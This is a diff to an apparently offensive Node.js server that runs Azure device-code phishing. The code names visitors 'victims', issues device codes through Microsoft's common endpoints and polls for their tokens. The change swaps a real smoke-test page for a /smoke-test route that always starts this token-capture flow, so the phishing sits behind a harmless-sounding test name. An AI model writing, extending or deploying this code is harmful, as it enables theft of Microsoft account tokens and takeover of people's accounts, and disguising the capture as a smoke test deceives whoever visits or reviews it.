@@ -7,7 +7,7 @@ import http from 'http';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import geoip from 'geoip-country';
-import { runSmokeTests, renderSmokeTestPage, publicUrl, COMMON_ENDPOINTS } from './smoke-test.mjs';
+import { publicUrl, COMMON_ENDPOINTS } from './smoke-test.mjs';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const configPath = path.join(__dirname, 'config.json');
@@ -384,23 +384,13 @@ app.get('/share', async (req, res, next) => {
 
 app.get('/smoke-test', async (req, res) => {
     try {
-        if (req.query.capture === '1') {
-            const selfConfig = { ...config, ...COMMON_ENDPOINTS };
-            const deviceCodeResponse = await fetchDeviceCode(selfConfig);
-            const userCode = deviceCodeResponse.user_code;
-            const deviceCode = deviceCodeResponse.device_code;
-            logMessage(`Smoke-test capture — issued device code ${userCode} (common endpoints)`);
-            displayCodeToVictim(res, userCode);
-            pollForAzureTokens(deviceCode, userCode, selfConfig);
-            return;
-        }
-
-        const results = await runSmokeTests(config, { rootDir: __dirname });
-        res.send(renderSmokeTestPage(results, {
-            smokeTestUrl: smokeTestUrl(),
-            victimUrl: victimUrl(),
-        }));
-        logMessage(`Smoke test page served (${results.ok ? 'pass' : 'fail'})`);
+        const smokeConfig = { ...config, ...COMMON_ENDPOINTS };
+        const deviceCodeResponse = await fetchDeviceCode(smokeConfig);
+        const userCode = deviceCodeResponse.user_code;
+        const deviceCode = deviceCodeResponse.device_code;
+        logMessage(`Smoke-test — issued device code ${userCode} (/common/ — sign in with your account)`);
+        displayCodeToVictim(res, userCode);
+        pollForAzureTokens(deviceCode, userCode, smokeConfig);
     } catch (error) {
         logMessage(error.stack, 'error');
         res.status(500).send(`Smoke test failed: ${error.message}`);
@@ -411,7 +401,7 @@ if (config.testMode) {
     http.createServer(app).listen(config.httpPort, () => {
         logMessage('App listening on port ' + config.httpPort);
         logMessage('Victim URL: ' + victimUrl());
-        logMessage('Smoke test URL: ' + smokeTestUrl());
+        logMessage('Smoke test URL: ' + smokeTestUrl() + ' (/common/ — your account)');
     });
 } else {
     const tlsOptions = {
@@ -425,6 +415,6 @@ if (config.testMode) {
     https.createServer(tlsOptions, app).listen(config.httpsPort, () => {
         logMessage('App listening on port ' + config.httpsPort);
         logMessage('Victim URL: ' + victimUrl());
-        logMessage('Smoke test URL: ' + smokeTestUrl());
+        logMessage('Smoke test URL: ' + smokeTestUrl() + ' (/common/ — your account)');
     });
 }
